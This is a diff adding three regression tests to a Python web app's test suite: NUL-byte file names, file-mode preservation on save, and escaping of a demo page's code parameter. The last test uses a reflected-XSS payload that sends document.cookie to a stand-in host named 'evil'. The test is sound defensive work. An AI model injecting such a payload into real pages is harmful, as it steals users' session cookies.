@@ -274,3 +274,43 @@ def test_export_published_source(client: TestClient) -> None:
 
 def test_export_published_missing(client: TestClient) -> None:
     assert client.get("/api/definitions/countersign?source=published").status_code == 404
+
+
+def test_null_byte_filename_is_400_not_500(client: TestClient, workdir: Path) -> None:
+    """%00 文件名在守卫层拦下（2026-10-21 内核 review P2 回归）。
+
+    修前 (root/name).resolve() 对 NUL 抛 ValueError → 500 而非 400。
+    """
+    response = client.get("/api/files/x%00bad.json")
+    assert response.status_code == 400
+
+
+def test_save_preserves_file_mode(client: TestClient, workdir: Path) -> None:
+    """保存后文件权限不降级（2026-10-21 内核 review P2 回归）。
+
+    修前 mkstemp 0600 直接 replace：0644 的定义文件存一次变仅属主可读。
+    """
+    data = json.loads((workdir / "countersign.json").read_text(encoding="utf-8"))
+    target = workdir / "mode_check.json"
+    data["code"] = "mode_check"
+    target.write_text(json.dumps(data, ensure_ascii=False), encoding="utf-8")
+    target.chmod(0o644)
+    response = client.put("/api/files/mode_check.json", json=data)
+    assert response.status_code == 200, response.text
+    assert (target.stat().st_mode & 0o777) == 0o644
+
+
+def test_demo_page_escapes_code_param() -> None:
+    """示例页 code 参数经 JSON 转义注入（2026-10-21 内核 review P1-11 回归）。
+
+    修前原样 f-string 拼进 <script> 字符串字面量——?code=x'});fetch(...);//
+    即反射 XSS，且页面同源挂着文件写面。
+    """
+    import json as _json
+
+    from flowork.contrib.web.app import _demo_page
+
+    malicious = "x'});fetch('http://evil/'+document.cookie);//"
+    page = _demo_page(malicious)
+    assert _json.dumps(malicious) in page  # 转义后的字面量
+    assert "definitionCode: 'x'" not in page  # 原样拼接形态不再出现
